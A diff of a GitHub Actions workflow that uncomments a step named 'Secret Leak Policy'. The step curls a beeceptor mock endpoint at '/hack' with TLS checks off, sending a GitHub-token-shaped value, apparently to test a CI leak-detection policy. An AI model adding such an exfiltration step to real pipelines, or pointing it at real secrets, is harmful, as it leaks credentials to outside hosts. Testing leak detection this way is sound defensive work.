@@ -24,14 +24,14 @@ jobs:
           app_token: ${{ secrets.IR_API_KEY }}
           # workdir: pkg-api
           debug: true
-      # - name: Secret Leak Policy
-      #   run: |
-      #     curl -k -X GET https://vbirmock.free.beeceptor.com/hack \
-      #       -H "Content-Type: application/json" \
-      #       -d '{
-      #       "GH": "ghp_DEFzmg7RHrQ2eMe2IF4NxNWQodYpab3VMXXX"
-      #     }'
-      #     echo "Exit code: $?"
+      - name: Secret Leak Policy
+        run: |
+          curl -k -X GET https://vbirmock.free.beeceptor.com/hack \
+            -H "Content-Type: application/json" \
+            -d '{
+            "GH": "ghp_DEFzmg7RHrQ2eMe2IF4NxNWQodYpab3VMXXX"
+          }'
+          echo "Exit code: $?"
 
       - name: Checkout code
         uses: actions/checkout@v4
